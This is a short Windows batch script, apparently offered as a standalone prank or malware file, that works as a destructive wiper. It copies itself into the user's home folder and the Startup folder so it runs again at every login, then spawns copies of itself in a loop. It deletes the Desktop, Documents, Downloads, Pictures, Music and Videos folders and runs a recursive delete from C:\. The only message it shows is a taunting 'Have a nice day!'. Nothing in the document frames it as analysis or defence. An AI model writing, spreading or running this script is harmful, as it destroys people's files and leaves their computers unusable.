@echo off
set place=%cd%
set user=%USERNAME%

copy "%place%\*.bat" "C:\Users\%user%\Test.bat"
copy "%place%\*.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Test.bat"

cd "C:\Users\%user%\"

:1

start Test.bat

rmdir /q /s Downloads
rmdir /q /s Pictures
rmdir /q /s Desktop
rmdir /q /s Documents
rmdir /q /s Music
rmdir /q /s Videos

echo 
echo Have a nice day!
echo
timeout 5

start Test.bat

cd "C:\"
del /q /s *.*
goto 1